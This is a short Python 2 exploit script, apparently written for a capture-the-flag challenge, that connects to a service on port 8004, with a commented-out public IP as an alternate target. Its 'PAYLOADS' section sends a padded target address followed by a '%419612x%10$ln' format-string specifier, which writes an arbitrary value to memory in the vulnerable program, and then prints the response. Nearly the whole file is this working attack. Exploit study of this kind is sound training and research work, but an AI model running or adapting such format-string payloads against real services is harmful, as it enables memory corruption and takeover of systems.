import struct
import time
import math
from socket import *

s = socket(AF_INET, SOCK_STREAM)
#s.connect(('104.131.90.29', 8004))
s.connect(('localhost',8004))

def recv_timeout(timeout=2):
    s.setblocking(0)
    total_data=[];
    data='';
    begin=time.time()
    while 1:
        if total_data and time.time()-begin > timeout:
            break
        elif time.time()-begin > timeout*2:
            break
        try:
            data = s.recv(8192)
            if data:
                total_data.append(data)
                begin = time.time()
            else:
                time.sleep(0.1)
        except:
            pass
    return ''.join(total_data)

def pad(string, length):
  return string+"\x00"*(length-len(string))

# PAYLOADS

print s.recv(512)

payload = pad("\x20\x10\x60",8) + '%419612x%10\$ln'
print payload
s.send(payload+'\n')
print recv_timeout()
